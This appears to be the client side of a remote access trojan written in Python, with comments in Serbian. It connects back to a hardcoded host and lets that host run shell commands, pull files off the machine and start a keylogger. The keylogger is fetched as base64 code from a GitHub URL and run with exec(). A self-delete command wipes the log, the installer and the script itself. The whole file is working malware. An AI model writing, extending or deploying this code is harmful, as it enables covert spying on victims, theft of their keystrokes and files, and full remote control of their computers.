import multiprocessing
import os
import socket
import subprocess
import threading
import time
import base64
import sys
import requests



SPACE = "<SeP@r@te>"


def socket_create():
    try:
        global host
        global port
        global s
        global spava
        spava = False
        host = '192.168.6.11'
        #host = '192.168.1.44'
        port = 6769
        s = socket.socket()
    except socket.error as msg:
        print(f"Socket creation error: {str(msg)}")


def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print(f"Socket creation error: {str(msg)}")
        time.sleep(3)
        socket.connect()


def read_file(path: str):
    with open(path, "rb") as file:
        return str(file.read())


def k_start():
    global spava
    spava = False
    data = requests.get("https://raw.githubusercontent.com/Caaki/Reve/main/k2.json").json()
    multiprocessing.Process(exec(base64.b64decode(data["1"]).decode("utf-8")),  shell=True,
                            stdout=subprocess.PIPE, stderr= subprocess.PIPE,
                            stdin=subprocess.PIPE)
    print("Stiglo je do ovde")
    print("Proslo je i do ovde")
    while spava:
        time.sleep(10)


def stop_key2():
    global spava
    spava = True
    for a in multiprocessing.process.active_children():
        a.terminate()


def create_thread2():
    global t
    t = threading.Thread(target=k_start)
    t.daemon = True
    t.start()


def create_thread():
    global sub
    data = requests.get("https://raw.githubusercontent.com/Caaki/Reve/main/k2.json").json()
    sub = subprocess.Popen(exec(base64.b64decode(data["1"]).decode("utf-8")),  shell=True,
                           stdout=subprocess.PIPE, stderr= subprocess.PIPE,
                           stdin=subprocess.PIPE)


def stop_key():
    global sub
    try:
        sub.terminate()
    except:
        print("ERROR")

def receive_commands():
    global sub
    while True:
        data = s.recv(2048)
        if data[:2].decode("utf-8") == "cd":
            try:
                os.chdir(data[3:].decode("utf-8"))
                s.send(str.encode(str(os.getcwd()) + "> "))
            except:
                print("Something went wrong")
                pass

        elif data[:4].decode("utf-8") == "quit":
            s.close()
            break

        elif data[:3].decode("utf-8") == "end":
            s.send(str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>end'))

            if os.path.exists("system32.txt"):
                os.remove("system32.txt")
            if os.path.exists("install.py"):
                os.remove("install.py")

            dir = os.getcwd()
            os.remove(dir+'\%s' % sys.argv[0])
            os._exit(1)

        elif data[:4].decode("utf-8") == "take":
            try:
                filename = str(data.decode("utf-8")[5:])
                size = os.path.getsize(filename)
                print(size)
                print(filename)
                s.send(f"{filename}{SPACE}{size}".encode())
                datoteka = open(filename, "rb")
                terminated = False
                while not terminated:
                    data = datoteka.read(4096)
                    if not data:
                        s.close()
                        terminated = False
                        break
                    print("POSLATO")
                    s.sendall(data)
                print("ZATVARA FAJL")
                datoteka.close()
                break
                # filename = str(data[5:])
                # filename = filename[2:-1]
                # print(filename)
                # print(filename)

                # s.send(filename.encode())
                # file = open(filename , "rb")
                # terminated = False
                # while not terminated:
                #     data = file.read(4096)
                #     if not data:
                #         terminated = False
                #     s.sendall(data)
                # file.close()

            except Exception as e:
                print("Error: " + str(e))
                # s.send(str.encode(filename))

        elif data[:8].decode("utf-8") == "download":
            tekst = read_file(data[9:].decode("utf-8"))
            print(str(tekst))
            s.send(str.encode(tekst + str(os.getcwd()) + ">down-file"))

        elif data[:5].decode("utf-8") == "start":
            create_thread2()
            s.send(str.encode("[+Key loger Started]" + str(os.getcwd()) + '>'))

        elif data[:7].decode("utf-8") == "stopkey":
            stop_key2()
            s.send(
                str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>'))
            if os.path.exists("system32.txt"):
                os.remove("system32.txt")


        elif len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"),  shell=True,
                                       stdout=subprocess.PIPE, stderr= subprocess.PIPE,
                                       stdin=subprocess.PIPE)

                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd())+ "> "))
            except:
                print(data.decode("utf-8"))
                output_str = "Comand not recognized\n"
                s.send(str.encode(output_str + str(os.getcwd()) + "> "))
    s.close()


def main():
    while True:
        try:
            socket_create()
            socket_connect()
            receive_commands()
        except:
            print("Error ocuered")
            s.close()
            time.sleep(3)

main()
